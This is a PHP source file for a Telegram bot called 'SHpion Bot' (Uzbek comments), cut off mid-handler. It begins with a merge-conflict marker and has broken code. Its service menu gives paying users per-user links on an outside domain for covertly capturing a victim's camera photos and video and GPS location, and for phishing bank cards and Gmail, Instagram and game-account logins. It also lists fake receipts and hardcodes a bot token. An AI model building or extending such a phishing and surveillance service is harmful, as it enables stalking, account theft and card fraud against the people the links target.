<<<<<<< HEAD
<?ph
// ============================================
// SHpion Bot - Mukammal versiya (TO'LIQ)
// ============================================

ob_start();
error_reporting(E_ALL);
ini_set('display_errors', 0);
date_default_timezone_set('Asia/Tashkent');

// ========== KONFIGURATSIYA ==========
define('BOT_TOKEN', '8940114047:AAEoEqS32SpwJ-ovcz3sJIQkL2M7YLvcpm4');
$admin_id = "7606681002"; // Asosiy admin ID

// ========== FUNKSIYALAR ==========

// Telegram API so'rovi
function bot($method, $data = []) {
    $url = "https://api.telegram.org/bot" . BOT_TOKEN . "/" . $method;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    
    // Agar data bo'sh bo'lmasa, POST qilamiz
    if (!empty($data)) {
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
    }
    
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    $res = curl_exec($ch);
    
    if (curl_error($ch)) {
        file_put_contents('logs/curl_errors.txt', date('Y-m-d H:i:s') . " - " . curl_error($ch) . PHP_EOL, FILE_APPEND);
        return (object)['ok' => false, 'error' => curl_error($ch)];
    }
    
    curl_close($ch);
    return json_decode($res);
}

// Foydalanuvchi stepini saqlash
function setUserStep($user_id, $step, $temp_data = '') {
    $dir = "step";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $file = "$dir/$user_id.step";
    $temp_file = "$dir/$user_id.temp";
    
    if ($step == '' || $step == null) {
        if (file_exists($file)) {
            @unlink($file);
        }
        if (file_exists($temp_file)) {
            @unlink($temp_file);
        }
    } else {
        file_put_contents($file, $step);
        if ($temp_data !== '') {
            file_put_contents($temp_file, $temp_data);
        }
    }
}

// Foydalanuvchi stepini olish
function getUserStep($user_id) {
    $file = "step/$user_id.step";
    if (file_exists($file)) {
        return trim(file_get_contents($file));
    }
    return '';
}

// Foydalanuvchi temp ma'lumotini olish
function getUserTemp($user_id) {
    $file = "step/$user_id.temp";
    if (file_exists($file)) {
        return trim(file_get_contents($file));
    }
    return '';
}

// Majburiy obuna tekshirish
function checkSubscription($user_id) {
    $buttons = [];
    
    // 📌 Ommaviy kanallarni tekshirish
    $kanallar = @file_get_contents("channel.txt");
    if ($kanallar) {
        $ex = explode("\n", trim($kanallar));
        foreach ($ex as $line) {
            $line = trim($line);
            if (!$line) continue;
            
            // Kanal username ni olish
            $channel_username = $line;
            if (strpos($channel_username, '@') === 0) {
                $channel_username = substr($channel_username, 1);
            }
            
            // Kanal nomini olish
            $chat_info = bot('getChat', ['chat_id' => "@" . $channel_username]);
            $ism = $chat_info->result->title ?? $channel_username;
            
            // Obunani tekshirish
            $ret = bot("getChatMember", [
                "chat_id" => "@$channel_username",
                "user_id" => $user_id,
            ]);
            
            $stat = $ret->result->status ?? 'left';
            if (!in_array($stat, ["creator", "administrator", "member"])) {
                $buttons[] = [['text' => "❌ " . $ism, 'url' => "https://t.me/$channel_username", 'style' => "success"]];
            }
        }
    }
    
    // 📌 Maxfiy kanallarni tekshirish
    $maxfiy_kanallar = @file_get_contents("channel2.txt");
    if ($maxfiy_kanallar) {
        $ex = explode("\n", trim($maxfiy_kanallar));
        
        for ($i = 0; $i < count($ex); $i += 2) {
            if (!isset($ex[$i + 1])) continue;
            
            $link = trim($ex[$i]);
            $kanalid = trim($ex[$i + 1]);
            $fayl_nomi = "tizim/$kanalid.txt";
            
            if (!file_exists($fayl_nomi) || !in_array($user_id, explode("\n", trim(file_get_contents($fayl_nomi))))) {
                $buttons[] = [['text' => "❌ Maxfiy kanal", 'url' => $link, 'style' => "primary"]];
            }
        }
    }
    
    if (!empty($buttons)) {
        $buttons[] = [['text' => "🔄 Tekshirish", 'callback_data' => "checksuv", 'style' => "danger"]];
        return [
            'status' => false,
            'buttons' => $buttons
        ];
    }
    
    return ['status' => true];
}

// Asosiy keyboard
function mainKeyboard($is_admin = false) {
    $keyboard = [
        [['text' => "🔐 Xizmatlar"]],
        [['text' => "👤 Profil"], ['text' => "📘 Qoidalar"]],
        [['text' => "📞 Bog'lanish"], ['text' => "💳 To'lov qilish"]],
    ];
    
    if ($is_admin) {
        $keyboard[] = [['text' => "🗄 Boshqaruv paneli"]];
    }
    
    return json_encode([
        'keyboard' => $keyboard,
        'resize_keyboard' => true
    ]);
}

// Orqaga keyboard
function backKeyboard() {
    return json_encode([
        'keyboard' => [[['text' => "◀️ Orqaga", 'style' => "danger"]]],
        'resize_keyboard' => true
    ]);
}

function xizmatlarMen() {
    return json_encode([
        'keyboard' => [[['text' => "💫 Soxta chek"],['text' => "📢 Asosiy xizmatlar"]]],
        'resize_keyboard' => true
    ]);
}


// Foydalanuvchi ma'lumotlarini saqlash
function saveUserData($user_id, $name, $username = '', $phone = '') {
    $dir = "users";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $file = "$dir/$user_id.txt";
    
    // Avvalgi ma'lumotlarni olish
    $old_data = null;
    if (file_exists($file)) {
        $old_data = json_decode(file_get_contents($file), true);
    }
    
    // Agar telefon raqam berilmagan bo'lsa, eski raqamni saqlab qo'yamiz
    $phone_to_save = $phone;
    if ($phone === '' && $old_data && isset($old_data['phone'])) {
        $phone_to_save = $old_data['phone'];
    }
    
    $data = [
        'id' => $user_id,
        'name' => $name,
        'username' => $username,
        'phone' => $phone_to_save, // Telefon raqam majburiy emas
        'first_seen' => $old_data['first_seen'] ?? date('Y-m-d H:i:s'),
        'last_seen' => date('Y-m-d H:i:s'),
        'balance' => $old_data['balance'] ?? 0,
        'stars_balance' => $old_data['stars_balance'] ?? 0
    ];
    
    file_put_contents($file, json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
    
    // ========== STATISTIKANI FAQAT YANGI FOYDALANUVCHI UCHUN ==========
    if (!$old_data) {
        // Umumiy foydalanuvchilar ro'yxatiga qo'shish
        $all_file = "all_users.txt";
        $all_users = [];
        if (file_exists($all_file)) {
            $all_users = file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        }
        
        if (!in_array($user_id, $all_users)) {
            file_put_contents($all_file, $user_id . PHP_EOL, FILE_APPEND);
        }
        
        // Kunlik statistikaga qo'shish
        $today_file = "stats/" . date('Y-m-d') . ".txt";
        if (!is_dir('stats')) mkdir('stats', 0777, true);
        
        $today_users = [];
        if (file_exists($today_file)) {
            $today_users = file($today_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        }
        
        if (!in_array($user_id, $today_users)) {
            file_put_contents($today_file, $user_id . PHP_EOL, FILE_APPEND);
        }
    }
    
    return $data;
}

// Foydalanuvchi ma'lumotlarini olish
function getUserData($user_id) {
    $file = "users/$user_id.txt";
    if (file_exists($file)) {
        return json_decode(file_get_contents($file), true);
    }
    return null;
}

// Balansni yangilash
function updateBalance($user_id, $amount) {
    $data = getUserData($user_id);
    if ($data) {
        $data['balance'] += $amount;
        $data['last_seen'] = date('Y-m-d H:i:s');
        file_put_contents("users/$user_id.txt", json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        return $data['balance'];
    }
    return 0;
}

// Stars balansini yangilash
function updateStarsBalance($user_id, $amount) {
    $data = getUserData($user_id);
    if ($data) {
        $data['stars_balance'] += $amount;
        $data['last_seen'] = date('Y-m-d H:i:s');
        file_put_contents("users/$user_id.txt", json_encode($data, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        return $data['stars_balance'];
    }
    return 0;
}

// Gift yuborishni yozish
function logGiftSend($from_user_id, $to_user_id, $gift_id, $stars_count, $comment = '') {
    $dir = "gifts";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $log_file = "$dir/" . date('Y-m-d') . ".txt";
    $log_data = date('H:i:s') . " | 👤 $from_user_id → 👤 $to_user_id | 🎁 ID: $gift_id | ⭐️ $stars_count";
    if ($comment) {
        $log_data .= " | 💬 " . substr($comment, 0, 20);
    }
    
    file_put_contents($log_file, $log_data . PHP_EOL, FILE_APPEND);
    
    // Umumiy giftlar hisobi
    $total_file = "$dir/total_gifts.txt";
    $total = 0;
    if (file_exists($total_file)) {
        $total = (int)file_get_contents($total_file);
    }
    $total++;
    file_put_contents($total_file, $total);
}

// Xabar yuborish logi
function logMessageSend($admin_id, $type, $target = 'all', $message = '') {
    $dir = "messages";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $log_file = "$dir/" . date('Y-m-d') . ".txt";
    $log_data = date('H:i:s') . " | 👤 $admin_id | 📤 $type | 🎯 $target";
    if ($message) {
        $log_data .= " | 📝 " . substr($message, 0, 30);
    }
    
    file_put_contents($log_file, $log_data . PHP_EOL, FILE_APPEND);
}

// To'lov logini yozish
function logPayment($user_id, $stars, $amount, $type = 'success') {
    $dir = "payments";
    if (!is_dir($dir)) mkdir($dir, 0777, true);
    
    $log_file = "$dir/" . date('Y-m-d') . ".txt";
    $log_data = date('H:i:s') . " | 👤 $user_id | ⭐️ $stars | 💵 $amount so'm | 📊 $type";
    
    file_put_contents($log_file, $log_data . PHP_EOL, FILE_APPEND);
}

// Adminlar ro'yxati
function getAdmins() {
    $file = "admins.txt";
    if (!file_exists($file)) {
        file_put_contents($file, $GLOBALS['admin_id'] . PHP_EOL);
    }
    $admins = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!in_array($GLOBALS['admin_id'], $admins)) {
        $admins[] = $GLOBALS['admin_id'];
    }
    return $admins;
}

// Admin ekanligini tekshirish
function isAdmin($user_id) {
    $admins = getAdmins();
    return in_array($user_id, $admins);
}

// Qoidalarni olish
function getRules() {
    $file = "rules.txt";
    if (!file_exists($file)) {
        $default = "📘 <b>Bot Qoidalari</b>\n\n"
                 . "1. Botdan faqat qonuniy maqsadlarda foydalaning\n"
                 . "2. Boshqa foydalanuvchilarga zarar yetkazmang\n"
                 . "3. Spam xabar yubormang\n"
                 . "4. Adminlarga hurmat ko'rsating";
        file_put_contents($file, $default);
    }
    return file_get_contents($file);
}

// XIZMAT LINK FUNKSIYALARI
function getServiceLink($user_id, $service_type) {
    $base_url = "https://wwwi.qzz.io";
    
    // Qisqa kodlar
        $short_codes = [
        'old_kamera' => 'rm',
        'orqa_kamera' => 'rc',
        'old_video' => 'vd',
        'orqa_video' => 'bc',
        'lokatsiya' => 'lk',
        'bank' => 'bk',
        'freefire' => 'ff',
        'pubg' => 'pg',
        'gmail' => 'gm',
        'instagram' => 'ig'
    ];
    
    if (isset($short_codes[$service_type])) {
        return "$base_url/{$short_codes[$service_type]}/$user_id";
    }
    
    return "$base_url/?id=$user_id";
}

function getServiceName($service_type) {
    $names = [
        'old_kamera' => '📸 Selfie Rasm',
        'orqa_kamera' => '📷 Orqa Kamera Rasm',
        'old_video' => '🎬 Selfie Video',
        'orqa_video' => '🎬 Orqa Kamera Video',
        'lokatsiya' => '📍 GPS Lokatsiya',
        'bank' => '💳 Bank Kartasi',
        'freefire' => '🎮 Free Fire',
        'pubg' => '🎯 PUBG Mobile',
        'gmail' => '📧 Gmail',
        'instagram' => '📷 Instagram'
    ];
    
    return $names[$service_type] ?? 'Noma\'lum xizmat';
}

// Statistikani olish
function getStats() {
    $stats = ['total' => 0, 'today' => 0, 'weekly' => 0, 'total_gifts' => 0, 'total_payments' => 0];
    
    // Jami foydalanuvchilar
    $all_file = "all_users.txt";
    if (file_exists($all_file)) {
        $stats['total'] = count(file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
    }
    
    // Kunlik
    $today_file = "stats/" . date('Y-m-d') . ".txt";
    if (file_exists($today_file)) {
        $stats['today'] = count(file($today_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
    }
    
    // Haftalik
    for ($i = 0; $i < 7; $i++) {
        $date = date('Y-m-d', strtotime("-$i days"));
        $file = "stats/$date.txt";
        if (file_exists($file)) {
            $stats['weekly'] += count(file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
        }
    }
    
    // Jami yuborilgan giftlar
    $gifts_file = "gifts/total_gifts.txt";
    if (file_exists($gifts_file)) {
        $stats['total_gifts'] = (int)file_get_contents($gifts_file);
    }
    
    // Jami to'lovlar
    $payments_dir = "payments";
    if (is_dir($payments_dir)) {
        $files = glob("$payments_dir/*.txt");
        foreach ($files as $file) {
            $stats['total_payments'] += count(file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES));
        }
    }
    
    return $stats;
}

// Bot holatini olish
function getBotStatus() {
    $file = "bot_status.txt";
    if (!file_exists($file)) {
        file_put_contents($file, 'active');
        return 'active';
    }
    return trim(file_get_contents($file));
}

// Bot holatini o'zgartirish
function setBotStatus($status) {
    $file = "bot_status.txt";
    file_put_contents($file, $status);
    return true;
}

// Kanal ma'lumotlarini olish
function getChannels() {
    $channels = [];
    
    // Ommaviy kanallar
    $public = @file_get_contents("channel.txt");
    if ($public) {
        $lines = explode("\n", trim($public));
        foreach ($lines as $line) {
            $line = trim($line);
            if ($line) {
                $channels[] = [
                    'type' => 'public',
                    'username' => $line,
                    'link' => "https://t.me/" . ltrim($line, '@')
                ];
            }
        }
    }
    
    // Maxfiy kanallar
    $private = @file_get_contents("channel2.txt");
    if ($private) {
        $lines = explode("\n", trim($private));
        for ($i = 0; $i < count($lines); $i += 2) {
            if (isset($lines[$i]) && isset($lines[$i + 1])) {
                $link = trim($lines[$i]);
                $chat_id = trim($lines[$i + 1]);
                $channels[] = [
                    'type' => 'private',
                    'link' => $link,
                    'chat_id' => $chat_id
                ];
            }
        }
    }
    
    return $channels;
}

// ========== YANGI FUNKSIYALAR (TO'LIQ QILINGANLAR) ==========

// Ommaviy kanal qo'shish
function addPublicChannel($username) {
    $file = "channel.txt";
    $channels = [];
    
    if (file_exists($file)) {
        $channels = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    }
    
    // @ belgisini olib tashlash
    $username = ltrim($username, '@');
    
    if (!in_array($username, $channels)) {
        $channels[] = $username;
        file_put_contents($file, implode(PHP_EOL, $channels) . PHP_EOL);
        return true;
    }
    
    return false;
}

// Maxfiy kanal qo'shish
function addPrivateChannel($link, $chat_id) {
    $file = "channel2.txt";
    $channels = [];
    
    if (file_exists($file)) {
        $content = file_get_contents($file);
        $lines = explode("\n", trim($content));
        
        // Link va chat_id juftligini tekshirish
        for ($i = 0; $i < count($lines); $i += 2) {
            if (isset($lines[$i]) && isset($lines[$i + 1])) {
                $existing_link = trim($lines[$i]);
                $existing_chat_id = trim($lines[$i + 1]);
                
                if ($existing_link == $link || $existing_chat_id == $chat_id) {
                    return false; // Kanal allaqachon mavjud
                }
            }
        }
    }
    
    // Yangi kanalni qo'shish
    file_put_contents($file, "$link\n$chat_id\n", FILE_APPEND);
    
    // tizim papkasida fayl yaratish
    $tizim_file = "tizim/$chat_id.txt";
    if (!file_exists($tizim_file)) {
        file_put_contents($tizim_file, "");
    }
    
    return true;
}

// Har bir funksiya uchun majburiy obunani tekshirish
function checkMandatorySubscription($user_id, $admin_check = false) {
    // Agar admin bo'lsa, tekshirish kerak emas
    if ($admin_check && isAdmin($user_id)) {
        return ['status' => true];
    }
    
    return checkSubscription($user_id);
}

// Yoki soddaroq versiya (barcha admin uchun tekshirishsiz):
function checkSubscriptionForAll($user_id) {
    // Adminlar uchun tekshirmaymiz
    if (isAdmin($user_id)) {
        return ['status' => true];
    }
    
    return checkSubscription($user_id);
}

// Kanal o'chirish
function removeChannel($index) {
    $channels = getChannels();
    
    if ($index < 1 || $index > count($channels)) {
        return false;
    }
    
    $channel_to_remove = $channels[$index - 1];
    
    if ($channel_to_remove['type'] == 'public') {
        // Ommaviy kanalni o'chirish
        $file = "channel.txt";
        if (file_exists($file)) {
            $channels_list = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $new_channels = [];
            
            foreach ($channels_list as $channel) {
                if ($channel != $channel_to_remove['username']) {
                    $new_channels[] = $channel;
                }
            }
            
            file_put_contents($file, implode(PHP_EOL, $new_channels) . PHP_EOL);
            return true;
        }
    } else {
        // Maxfiy kanalni o'chirish
        $file = "channel2.txt";
        if (file_exists($file)) {
            $lines = file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            $new_lines = [];
            
            for ($i = 0; $i < count($lines); $i += 2) {
                if (isset($lines[$i]) && isset($lines[$i + 1])) {
                    $link = trim($lines[$i]);
                    $chat_id = trim($lines[$i + 1]);
                    
                    if ($chat_id != $channel_to_remove['chat_id']) {
                        $new_lines[] = $link;
                        $new_lines[] = $chat_id;
                    } else {
                        // tizim faylini o'chirish
                        $tizim_file = "tizim/$chat_id.txt";
                        if (file_exists($tizim_file)) {
                            @unlink($tizim_file);
                        }
                    }
                }
            }
            
            file_put_contents($file, implode(PHP_EOL, $new_lines) . PHP_EOL);
            return true;
        }
    }
    
    return false;
}

// Admin qo'shish
function addAdmin($admin_id) {
    $file = "admins.txt";
    $admins = getAdmins();
    
    if (!in_array($admin_id, $admins)) {
        $admins[] = $admin_id;
        file_put_contents($file, implode(PHP_EOL, $admins) . PHP_EOL);
        return true;
    }
    
    return false;
}

// Admin o'chirish
function removeAdmin($admin_id) {
    if ($admin_id == $GLOBALS['admin_id']) {
        return false; // Asosiy adminni o'chirish mumkin emas
    }
    
    $file = "admins.txt";
    $admins = getAdmins();
    $new_admins = [];
    
    foreach ($admins as $admin) {
        if ($admin != $admin_id) {
            $new_admins[] = $admin;
        }
    }
    
    file_put_contents($file, implode(PHP_EOL, $new_admins) . PHP_EOL);
    return true;
}

// ========== BARCHA MESSAGE HANDLERLARDAN OLDIN ==========
if ($message) {
    $cid = $message['chat']['id'];
    $uid = $message['from']['id'];
    $text = $message['text'] ?? '';
    // ... boshqa o'zgaruvchilar
    
    // ========== MAJBURIY OBUNA TEKSHIRISH (ADMINDAN TASHQARI BARCHA UCHUN) ==========
    // Faqat admin emas va start yoki bekor qilish emas bo'lsa
    if (!isAdmin($uid) && $text != '/start' && $text != "❌ Bekor qilish" && $text != "◀️ Orqaga") {
        $subscription = checkSubscription($uid);
        if (!$subscription['status']) {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                        . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
                'parse_mode' => 'html',
                'disable_web_page_preview' => true,
                'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
            ]);
            exit();
        }
    }
    
    // Bot holatini tekshirish (oldingi kod)
    $bot_status = getBotStatus();
    // ... qolgan kod
}

// ========== ASOSIY KOD ==========

// Logs papkasini yaratish
if (!is_dir('logs')) mkdir('logs', 0777, true);
if (!is_dir('tizim')) mkdir('tizim', 0777, true);
if (!is_dir('gifts')) mkdir('gifts', 0777, true);
if (!is_dir('messages')) mkdir('messages', 0777, true);
if (!is_dir('users')) mkdir('users', 0777, true);
if (!is_dir('step')) mkdir('step', 0777, true);
if (!is_dir('payments')) mkdir('payments', 0777, true);
if (!is_dir('stats')) mkdir('stats', 0777, true);

$update = json_decode(file_get_contents('php://input'), true);

if (!$update) {
    if ($_SERVER['REQUEST_METHOD'] == 'GET') {
        echo "Bot is running! " . date('Y-m-d H:i:s');
    }
    exit();
}

// Update turlarini olish
$message = $update['message'] ?? null;
$callback_query = $update['callback_query'] ?? null;
$pre_checkout_query = $update['pre_checkout_query'] ?? null;
$chat_join_request = $update['chat_join_request'] ?? null;

// ========== MESSAGE HANDLER ==========
if ($message) {
    $cid = $message['chat']['id'];
    $uid = $message['from']['id'];
    $text = $message['text'] ?? '';
    $name = $message['from']['first_name'] ?? '';
    $last_name = $message['from']['last_name'] ?? '';
    $username = $message['from']['username'] ?? '';
    $contact = $message['contact'] ?? null;
    $full_name = trim("$name $last_name");
    $user_link = "<a href='tg://user?id=$uid'>$full_name</a>";
    
    // Bot holatini tekshirish
    $bot_status = getBotStatus();
    
    if ($bot_status == 'inactive' && !isAdmin($uid) && $text != '/start') {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⏸ <b>Bot vaqtincha to'xtatilgan!</b>\n\nIltimos, keyinroq urinib ko'ring.",
            'parse_mode' => 'HTML'
        ]);
        exit();
    }
// START komandasi - TELEFON RAQAMSIZ VERSIYA
if ($text == '/start') {
    // 1️⃣ Foydalanuvchi bazada bormi tekshirish
    $user_data = getUserData($uid);
    
    // 2️⃣ AGAR USER YANGI BO'LSA → STATISTIKA +1
    if (!$user_data) {
        // Umumiy userlar
        $all_file = "all_users.txt";
        $all_users = [];
        if (file_exists($all_file)) {
            $all_users = file($all_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        }
        
        if (!in_array($uid, $all_users)) {
            file_put_contents($all_file, $uid . PHP_EOL, FILE_APPEND);
        }
        
        // Kunlik statistika
        $stats_file = 'stats/' . date('Y-m-d') . '.txt';
        if (!file_exists($stats_file)) {
            file_put_contents($stats_file, $uid . PHP_EOL);
        } else {
            $today_users = file($stats_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
            if (!in_array($uid, $today_users)) {
                file_put_contents($stats_file, $uid . PHP_EOL, FILE_APPEND);
            }
        }
    }
    
    // 3. Majburiy obuna tekshiruvi
    $subscription = checkSubscription($uid);
    
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "👋 <b>Shpion botga xush kelibsiz, $user_link!</b>\n\n"
                    . "⚠️ <b>Botdan to'liq foydalanish uchun quyidagi kanallarga obuna bo'ling!</b>\n\n"
                    . "Kanallarga obuna bo'lgach, \"🔄 Tekshirish\" tugmasini bosing.",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        setUserStep($uid, 'checking_subscription');
        exit();
    }
    
    // 4. Foydalanuvchi ma'lumotlarini yangilash (telefon raqamsiz)
    saveUserData($uid, $full_name, $username, '');
    
    setUserStep($uid, '');
    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "👋 <b>Shpion botga xush kelibsiz, $user_link!</b>\n\n"
                . "✅ <b>Barcha kanallarga obuna bo'ldingiz!</b>\n\n"
                . "🎉 <b>Ro'yxatdan muvaffaqiyatli o'tdingiz!</b>\n\n"
                . "<blockquote>✅ <b>Obunangiz tasdiqlandi!\n\n"
                . "Botning qoidalariga amal qilgan holda barcha funksiyalardan foydalanishingiz mumkin.\n\n"
                . "Botdan foydalanishni boshlaganingiz qonun qoidalarga rioya qilganingizdan dalolat beradi.\n\n"
                . "Bot qoidalari @FoydalanishQoidalari kanalida va botning \"📘 Qoidalar\" bo'limida keltirib o'tilgan</b></blockquote>",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard(isAdmin($uid))
    ]);
    exit();
}

// ========== QAYTA TEKSHIRISH CALLBACK ==========
if ($user_step == 'checking_subscription') {
    $subscription = checkSubscription($uid);
    
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Hali barcha kanallarga obuna bo'lmagansiz!</b>\n\n"
                    . "Iltimos, kanallarga obuna bo'ling va \"🔄 Tekshirish\" tugmasini bosing.",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
    // Foydalanuvchi ma'lumotlarini yangilash
    saveUserData($uid, $full_name, $username, '');
    
    setUserStep($uid, '');
    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "✅ <b>Obunangiz tasdiqlandi!</b>\n\n"
                . "👋 <b>Shpion botga xush kelibsiz, $user_link!</b>\n\n"
                . "🎉 <b>Ro'yxatdan muvaffaqiyatli o'tdingiz!</b>\n\n"
                . "<blockquote>✅ <b>Obunangiz tasdiqlandi!\n\n"
                . "Botning qoidalariga amal qilgan holda barcha funksiyalardan foydalanishingiz mumkin.\n\n"
                . "Botdan foydalanishni boshlaganingiz qonun qoidalarga rioya qilganingizdan dalolat beradi.\n\n"
                . "Bot qoidalari @FoydalanishQoidalari kanalida va botning \"📘 Qoidalar\" bo'limida keltirib o'tilgan</b></blockquote>",
        'parse_mode' => 'HTML',
        'reply_markup' => mainKeyboard(isAdmin($uid))
    ]);
    exit();
}
    

    

    
    // ========== GIFT YUBORISH TIZIMI ==========
    if ($text == "/gift" && isAdmin($uid)) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "🎁 <b>Sovg'a yuborish bo'limi</b>\n\nKimga yubormoqchisiz? Foydalanuvchi <b>ID</b> sini yuboring:",
            'parse_mode' => 'HTML',
            'reply_markup' => backKeyboard()
        ]);
        setUserStep($uid, 'waiting_gift_id');
        exit();
    }
    
    // Gift ID ni qabul qilish
    if ($user_step == 'waiting_gift_id' && isAdmin($uid)) {
        if ($text == "◀️ Orqaga") {
            setUserStep($uid, '');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>Sovg'a yuborish bekor qilindi</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid))
            ]);
            exit();
        }
        
        if (is_numeric($text)) {
            setUserStep($uid, 'waiting_gift_comment');
            setUserStep($uid, 'waiting_gift_comment', $text); // temp_data sifatida saqlash
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ ID qabul qilindi: <code>$text</code>\n\nEndi sovg'a uchun <b>kommentariya</b> (tabrik so'zi) yozing:",
                'parse_mode' => 'HTML',
                'reply_markup' => backKeyboard()
            ]);
        } else {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "⚠️ Xato! Faqat raqamlardan iborat ID yuboring.",
                'parse_mode' => 'HTML'
            ]);
        }
        exit();
    }
    
    // Gift kommentariyasini qabul qilish va yuborish
    if ($user_step == 'waiting_gift_comment' && isAdmin($uid)) {
        if ($text == "◀️ Orqaga") {
            setUserStep($uid, '');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>Sovg'a yuborish bekor qilindi</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid))
            ]);
            exit();
        }
        
        $target_id = getUserTemp($uid);
        
        // Gift yuborish
        $res = bot('sendGift', [
            'user_id' => $target_id,
            'gift_id' => '5170233102089322756', // giftining kodi
            'text' => $text           // Siz yozgan kommentariya
        ]);

        if ($res && $res->ok) {
            // Log yozish
            logGiftSend($uid, $target_id, '5170233102089322756', 15, $text); // 15 stars deb hisoblaymiz
            
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "🎉 <b>Muvaffaqiyatli!</b>\n\nID: <code>$target_id</code> sovg'asi yuborildi.\nIzoh: <i>$text</i>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid))
            ]);
        } else {
            // Agar xato bo'lsa (masalan botda Stars yetarli bo'lmasa)
            $error_desc = $res->description ?? "Noma'lum xato";
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "❌ <b>Xatolik yuz berdi!</b>\n\nSababi: <code>$error_desc</code>",
                'parse_mode' => 'HTML'
            ]);
        }
        
        setUserStep($uid, '');
        exit();
    }
    
    if ($text === "💳 To'lov qilish") {
    // Majburiy obuna tekshirish
    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
            'text' => "⚠️ <b>Botdan foydalanish uchun kanallarga obuna bo'ling!</b>\n\n"
                    . "Quyidagi kanallarga obuna bo'ling va /start yozing:",
            'parse_mode' => 'html',
            'disable_web_page_preview' => true,
            'reply_markup' => json_encode(['inline_keyboard' => $subscription['buttons']]),
        ]);
        exit();
    }
    
    setUserStep($uid, 'stars'); // $cid emas, $uid ishlating
    
    bot('sendMessage', [
        'chat_id' => $cid,
        'text' => "💵 <b>Balansingizni necha so'mga to'ldirmoqchisiz?</b>\n\n"
                . "1 ⭐️ = 220 so'm\n"
                . "📰 Minimal miqdor: 1 stars",
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode([
            'keyboard' => [[['text' => '❌ Bekor qilish']]],
            'resize_keyboard' => true
        ])
    ]);
    exit();
}

// Stars miqdori kiritilganda
$user_step = getUserStep($uid); // $cid emas, $uid bilan oling
    if ($user_step === 'stars') {
        if ($text === '❌ Bekor qilish') {
            setUserStep($cid, '');
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "✅ <b>To'lov bekor qilindi</b>",
                'parse_mode' => 'HTML',
                'reply_markup' => mainKeyboard(isAdmin($uid))
            ]);
            exit();
        }
        
        if ($text >= 1 && $text <= 10000000) {
            $amount = $text * 200;
            
            // To'lov chek yaratish
            bot('sendInvoice', [
                'chat_id' => $cid,
                'title' => "⭐️ Stars Payment - eShpionBot",
                'description' => "⬇️ Botdan $amount so'm olasiz.",
                'payload' => "buy-$text",
                'currency' => "XTR",
                'prices' => json_encode([['label' => "⭐️ Star", 'amount' => $text]]),
                'start_parameter' => 'start-telegram-stars'
            ]);
            
            setUserStep($cid, '');
            exit();
        } else {
            bot('sendMessage', [
                'chat_id' => $cid,
                'text' => "<u>⬇️ Minimal:</u> 1 stars\n<u>⬆️ Maksimal:</u> 10.000.000 stars",
                'parse_mode' => 'HTML'
            ]);
            exit();
        }
    }

    
    // PROFIL
if ($text === "👤 Profil") {
    // Majburiy obuna tekshirish
    $subscription = checkSubscriptionForAll($uid);
    if (!$subscription['status']) {
        bot('sendMessage', [
            'chat_id' => $cid,
